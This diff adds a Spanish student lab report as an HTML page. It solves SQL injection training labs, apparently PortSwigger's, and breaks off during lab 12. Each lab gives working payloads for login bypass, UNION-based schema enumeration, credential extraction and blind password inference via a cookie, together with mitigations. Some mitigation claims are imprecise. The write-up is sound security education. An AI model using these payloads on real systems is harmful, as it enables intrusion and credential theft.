@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 8: Laboratorios SQLi | CNO V</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <link rel="stylesheet" href="style2.css"> 
+</head>
+<body>
+
+    <div class="scanlines"></div>
+
+    <div class="container">
+        
+        <header>
+            <div class="header-top">
+                <div class="user-info">
+                    <h1 class="glitch" data-text="ACT.08: ROAD TO HALL OF FAME">ACT.08: ROAD TO HALL OF FAME</h1>
+                    <p class="subtitle">> TEMA: <span class="highlight">RESOLUCIÓN DE LABS SQL INJECTION</span></p>
+                    <p class="subtitle">> EQUIPO: [05] | ALUMNO: [Coronado Noriega Jesús Olaf - 178991]</p>
+                </div>
+                <div style="text-align: right; min-width: 150px;">
+                    <a href="../actividades.html" class="cyber-btn" style="font-size: 0.8rem;">
+                        << VOLVER A LISTA
+                    </a>
+                </div>
+            </div>
+        </header>
+
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="act08-Equipo5.pdf" download class="cyber-btn" style="display: inline-block; width: auto; max-width: 90%; padding: 15px 40px; font-size: 1.1rem; border-width: 2px;">
+                <i class="fas fa-file-pdf"></i> [ DESCARGAR PDF ORIGINAL ]
+            </a>
+        </div>
+
+        <section class="panel">
+            <h2><span class="prefix">#</span> 01_MARCO_TEÓRICO:_SQL_INJECTION</h2>
+            
+            <div class="content-box">
+                <p>> <strong>Definición del Riesgo:</strong> Las aplicaciones web modernas dependen ampliamente de bases de datos para almacenar información crítica (credenciales, datos financieros, registros). Esta interacción constante introduce vulnerabilidades graves cuando las entradas del usuario no son validadas adecuadamente.</p>
+                <p>> <strong>¿Qué es SQL Injection (SQLi)?</strong> Es una vulnerabilidad que ocurre cuando una aplicación permite que datos maliciosos introducidos por un atacante se incorporen directamente dentro de consultas SQL ejecutadas por el backend. Esto altera la lógica original de la consulta.</p>
+                <p>> <strong>Impacto (CIA):</strong> El atacante puede evadir la autenticación, acceder a información sensible (Confidencialidad), modificar o borrar registros (Integridad) o incluso provocar la caída de la base de datos (Disponibilidad).</p>
+            </div>
+
+            <div class="terminal-box">
+                <h3>// CLASIFICACIÓN_DE_ATAQUES_SQLi</h3>
+                <ul class="binary-list">
+                    <li>> <strong>In-band SQLi (Classic/Union):</strong> El atacante utiliza el mismo canal de comunicación para lanzar el ataque y extraer los resultados directamente en la respuesta HTTP.</li>
+                    <li>> <strong>Inferential SQLi (Blind):</strong> No hay transferencia directa de datos. El atacante infiere la estructura y los datos observando el comportamiento del servidor (provocando errores forzados o retrasos de tiempo).</li>
+                    <li>> <strong>Out-of-band SQLi (OAST):</strong> Los datos se exfiltran utilizando un canal alternativo, forzando al servidor de base de datos a emitir peticiones DNS o HTTP hacia un dominio controlado por el atacante.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="panel">
+            <h2><span class="prefix">#</span> 02_BITÁCORA_DE_LABORATORIOS_(18 MODULOS DETALLADOS)</h2>
+            <p style="margin-bottom: 20px;">> Despliegue el módulo para inspeccionar el reporte técnico detallado y las cargas útiles (Payloads).</p>
+            
+            <div class="accordion-wrapper">
+
+                <div class="accordion-item">
+                    <button class="accordion-btn active" onclick="toggleAccordion(this)">
+                        [LAB_01] SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content" style="display: block;">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Apprentice (Aprendiz)</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">SQLi clásica (Cláusula WHERE)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Modificar la consulta SQL para que la aplicación muestre todos los productos de una categoría específica, incluyendo aquellos que aún no han sido lanzados (released = 0).</p>
+                            
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La vulnerabilidad ocurre porque la aplicación concatena directamente la entrada del usuario en una consulta SQL sin sanitizarla. La consulta original es: <code>SELECT * FROM products WHERE category = '[CATEGORÍA]' AND released = 1</code>. Al no haber validación, un atacante puede cerrar la comilla simple y añadir operadores lógicos (OR) alterando la condición.</p>
+                            
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Acceder al laboratorio e interactuar con el filtro seleccionando cualquier categoría (ej. "Gifts").<br>
+                            2. Abrir Burp Suite, interceptar la petición que se ve así: <code>GET /filter?category=Gifts</code>.<br>
+                            3. Enviar la petición al Repeater, cambiando el valor por el payload: <code>' OR 1=1--</code><br>
+                            4. Enviar y observar que la respuesta HTTP 200 contiene productos ocultos.</p>
+                            
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>' (Comilla simple):</strong> Rompe la cadena de texto original en la consulta SQL.<br>
+                            - <strong>OR 1=1:</strong> Es una condición siempre verdadera. Basta con que sea cierto para devolver todas las filas.<br>
+                            - <strong>-- (Doble guion):</strong> Carácter de comentario en SQL que hace que el resto de la consulta original sea ignorado.</p>
+                            
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> La forma más efectiva de prevenir este ataque es dejar de concatenar strings y utilizar <strong>Consultas Preparadas (Parameterized Queries)</strong>, pasando el valor del usuario como un parámetro aislado.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'+OR+1=1--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_02] SQL injection vulnerability allowing login bypass
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Apprentice</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">SQL Injection – Login Bypass</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Explotar una vulnerabilidad en la función de inicio de sesión para evadir el mecanismo de autenticación e iniciar sesión como el usuario 'administrator' sin conocer la contraseña.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La aplicación web no valida los datos del usuario en la consulta: <code>SELECT * FROM users WHERE username = 'input' AND password = 'input'</code>. Si un atacante introduce código SQL dentro del campo username, puede comentar la verificación de contraseña.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Abrir la página de inicio de sesión.<br>
+                            2. Configurar Burp Suite Proxy para interceptar las peticiones HTTP de login.<br>
+                            3. Modificar el parámetro `username` agregando el payload.<br>
+                            4. Enviar la solicitud modificada y acceder al sistema exitosamente.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>administrator:</strong> Indica el nombre del usuario al que se desea acceder.<br>
+                            - <strong>' (Comilla simple):</strong> Cierra la cadena original.<br>
+                            - <strong>-- (Doble guion):</strong> Comenta la parte que verifica la contraseña.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Implementar mecanismos de autenticación seguros, uso de ORM seguros y validación de entradas del usuario.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Username ></span> <span class="command">administrator'--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_03] SQLi attack, querying database type and version on Oracle
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union Based (Oracle)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Explotar SQLi para extraer y visualizar la cadena de texto que indica la versión específica de la base de datos Oracle del servidor.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> Falta de validación en la búsqueda. A diferencia de MySQL, Oracle exige que toda sentencia SELECT tenga una tabla de origen (FROM table). Se requiere usar la tabla integrada `dual` o las vistas de sistema como `v$version`.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Inyectar `'order by 1 --` para definir la cantidad de columnas (En este caso 2).<br>
+                            2. Hacer uso de union select para confirmar que el contenido acepta cadenas.<br>
+                            3. Usar UNION SELECT con la tabla `v$version` y enviar al navegador para ver el resultado.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>UNION:</strong> Une resultados originales con los inyectados.<br>
+                            - <strong>SELECT banner, NULL:</strong> Solicita la columna banner (versión en Oracle) y un NULL para completar el número de columnas (2).<br>
+                            - <strong>FROM v$version:</strong> Tabla de sistema en Oracle con detalles del software.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Validación estricta que asegure que la entrada coincida con el tipo y longitud esperada, y saneamiento (Escapado) de caracteres.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'UNION SELECT banner, NULL FROM v$version--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_04] SQLi attack, querying database type on MySQL/Microsoft
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union Based (MySQL/MSSQL)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Extraer la versión específica de bases de datos MySQL o Microsoft SQL Server utilizando inyección UNION.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> A diferencia de Oracle, MySQL/MSSQL permiten consultas sin cláusula obligatoria (sin FROM dual). Se puede consultar la variable global `@@version` directamente.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Obtener número de columnas mediante `order by` (2 columnas).<br>
+                            2. Intentar `UNION SELECT 'test', 'test'` para confirmar cadenas de texto.<br>
+                            3. Inyectar `@@version` y codificar en URL/HTML en Burp Suite.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>@@version:</strong> Variable global de MSSQL/MySQL con info de arquitectura y versión.<br>
+                            - <strong>#:</strong> Indica al motor que ignore el resto (el equivalente a -- en otros motores).</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Implementar WAF (Web Application Firewall) para detectar sentencias parametrizadas y uso de ORMs.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'UNION SELECT @@version, NULL #</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_05] SQLi attack, listing database contents (Non-Oracle)
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union Based (Enumeración)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Explotar SQLi para enumerar la estructura (tablas y columnas) e identificar credenciales usando el diccionario `information_schema`.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La base de datos (PostgreSQL/MySQL) expone metadatos estructurales en el information_schema, permitiendo al atacante descubrir tablas de nombres aleatorios.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Consultar tablas: `SELECT table_name, NULL FROM information_schema.tables`.<br>
+                            2. Se descubrió la tabla `users_tsxdtp`.<br>
+                            3. Consultar columnas: `SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_tsxdtp'`.<br>
+                            4. Se descubrieron las columnas `username_ehtexd` y `password_dwlwcx`.<br>
+                            5. Extraer credenciales y loguearse.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload final:</strong> <br>
+                            - <strong>username_ehtexd, password_dwlwcx:</strong> Columnas específicas con sufijos aleatorios descubiertas dinámicamente.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Configurar privilegios estrictos en la BD para que el usuario de la app no pueda consultar esquemas de información.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'UNION SELECT username_ehtexd, password_dwlwcx FROM users_tsxdtp--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_06] Enumerar contenido de la base de datos en Oracle
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union-based (Oracle)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Descubrir la estructura de la base de datos Oracle extrayendo datos estructurales para recuperar credenciales de usuarios.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> A diferencia de PostgreSQL/MySQL, en Oracle los metadatos se guardan en las vistas de sistema `all_tables` y `all_tab_columns`.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Buscar tablas: `+UNION+SELECT+table_name,+NULL+FROM+all_tables--`<br>
+                            2. En la respuesta, se identifica la tabla `USERS_SDENDO`.<br>
+                            3. Buscar columnas de esa tabla: `...+FROM+all_tab_columns+WHERE+table_name='USERS_SDENDO'--`<br>
+                            4. Se obtienen las columnas `USERNAME_MCANOW` y `PASSWORD_WUJBYQ`.<br>
+                            5. Extraer credenciales y acceder.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload final:</strong> La inyección se hace directamente con los nombres de tablas ofuscados obtenidos desde el diccionario nativo de Oracle.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Cambiar contraseñas si hay compromiso, auditar logs y parchear con ORM/consultas preparadas.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'+UNION+SELECT+USERNAME_MCANOW,+PASSWORD_WUJBYQ+from+USERS_SDENDO--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_07] Ataque UNION determinando número de columnas
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union-based</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Determinar la cantidad exacta de columnas que devuelve la consulta original. Este es el paso "cero" para construir cualquier ataque UNION.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La base de datos es susceptible a manipulación. Si se inyecta un UNION con distinto número de columnas, arroja un error visible como 'column count mismatch'.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Enviar payload de 1 columna: `'+UNION+select+NULL--` (Marca error).<br>
+                            2. Aumentar a 2: `'+UNION+select+NULL,+NULL--` (Marca error).<br>
+                            3. Aumentar a 3: `'+UNION+select+NULL,+NULL,+NULL--` (La página carga datos normales, confirmando que son 3 columnas).</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> Se utilizan valores `NULL` porque son compatibles con cualquier tipo de dato subyacente (texto, entero, fechas), evitando fallos de compatibilidad en esta fase de descubrimiento.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Validar y bloquear patrones comunes en las URL como `ORDER BY N` o secuencias de `UNION SELECT`.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'+UNION+select+NULL,+NULL,+NULL--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_08] Búsqueda de una columna que contiene texto
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union-based</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Determinar qué columna (de las descubiertas previamente) es compatible con datos de cadena de texto (String) para usarlas de puente de extracción.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> Las columnas de la consulta devuelven datos sin sanitización tipológica, permitiendo que Strings inyectados pasen directo a la interfaz del usuario.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Se sustituye el primer NULL por texto: `'UNION select 'abc', NULL, NULL--` (Error).<br>
+                            2. Se intenta la segunda: `'UNION select NULL, 'Ufj32W', NULL--` (Carga exitosamente mostrando 'Ufj32W' en pantalla). Esto confirma la columna útil.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> Se inyecta una cadena aleatoria en las diferentes posiciones de la cláusula UNION. Donde no reviente el servidor, ahí se pueden inyectar las subconsultas extractoras de credenciales.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Limitar el daño con usuarios de base de datos sin permisos de lectura sobre metadatos.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">'UNION select NULL , 'Ufj32W' , NULL --</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_09] SQL injection UNION attack, retrieving data from other tables
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union-based</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Extraer información sensible (usuarios y passwords) de una tabla ajena a la de la consulta original para tomar control del sistema como 'administrator'.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La interfaz que renderiza la tabla `products` no diferencia el origen de los datos; simplemente renderiza cualquier conjunto resultante devuelto por la consulta UNION adulterada.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Tras confirmar 2 columnas de texto, se arma la petición.<br>
+                            2. Se reemplazan los NULL por nombres de columnas conocidas (`username`, `password`).<br>
+                            3. Se analiza la respuesta visual donde los usuarios y hashes aparecen incrustados entre la lista de productos.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>SELECT username, password FROM users:</strong> Instrucción maliciosa añadida. Las dos columnas pedidas encajan perfecto con las dos columnas de la tabla original de productos.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Implementar una "lista blanca" (allowlist) de categorías permitidas. Si no está en la lista pre-aprobada, el backend aborta antes de tocar la DB.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">' UNION SELECT username, password FROM users--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_10] SQLi UNION attack, retrieving multiple values in a single column
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Union-based / String Concatenation</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Extraer múltiples campos (usuario y contraseña) teniendo el obstáculo técnico de que la consulta original solo muestra una sola columna de tipo texto.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La base de datos obedece funciones nativas de manipulación de cadenas (concatenación) insertadas por el usuario, comprimiendo múltiples datos secretos en el único canal de salida disponible.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Confirmar con NULLs que la base devuelve 2 columnas, pero solo la segunda admite String.<br>
+                            2. Solicitar los datos pegándolos con un separador como el tilde (`~`).<br>
+                            3. Buscar en la respuesta web la línea `administrator~[password]`.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>|| (Doble barra vertical):</strong> Operador SQL para concatenar cadenas de texto.<br>
+                            - <strong>username||'~'||password:</strong> Obliga al motor a unir ambas columnas de la BD en un solo gran bloque de texto que se colará por la única tubería libre de la web.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Uso indiscutible de consultas preparadas para que comandos como el `||` sean interpretados como simples literales inofensivos y no como código ejecutable.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Input ></span> <span class="command">' UNION SELECT NULL, username||'~'||password FROM users--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_11] Blind SQL Injection with Conditional Responses
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Blind SQLi (Boolean-based)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Inferir la contraseña del administrador en un escenario "ciego", analizando si la aplicación devuelve o no el mensaje "Welcome back".</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La cookie `TrackingId` se evalúa directamente. Si la consulta SQL interna es verdadera (`1=1`), el backend muestra el texto "Welcome back" en el HTML. Si es falsa (`1=2`), no lo muestra.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Validar vulnerabilidad en la cookie TrackingId con AND '1'='1'.<br>
+                            2. Calcular longitud: `... AND LENGTH(password)>10...`.<br>
+                            3. Usar Burp Intruder para hacer ataques de fuerza bruta posicional carácter por carácter.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>SUBSTRING(password,1,1)='a':</strong> Extrae la posición 1 del password. Pregunta: ¿Es 'a'? Si el sistema devuelve Welcome back, adivinamos la letra. El proceso se automatiza con Intruder para todas las posiciones.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Tratar todas las cookies de sesión/tracking como datos no confiables y pasarlas a través de validación estricta y consultas preparadas.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Cookie ></span> <span class="command">xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_12] Blind SQL Injection with Conditional Errors
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Blind SQLi (Conditional Errors)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Inferir la contraseña forzando errores intencionales en la BD mediante cálculos matemáticos imposibles (división por cero) condicionados a valores lógicos.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> A diferencia del anterior, aquí no hay "Welcome back". La página siempre es idéntica. Pero si la consulta causa un fallo interno (Error 500), se puede usar ese error como indicador booleano.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Modificar la Cookie TrackingId insertando una sentencia `CASE WHEN`.<br>
+                            2. Si se adivina la letra correcta (TRUE), el motor ejecuta un comando sano `TO_CHAR(1)`.<br>
+                            3. Si se equivoca, ejecuta `1/0` (Error matemático), el servidor lanza HTTP 500 y sabemos que la letra es incorrecta.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>CASE WHEN... THEN ... ELSE ... END:</strong> Condicional SQL de Oracle. Provocar fallos intencionalmente actúa como una baliza de señalización de datos.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Implementar manejo universal de errores genéricos en el framework (Try/Catch globales) que oculten el HTTP 500 originado en la capa de datos.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
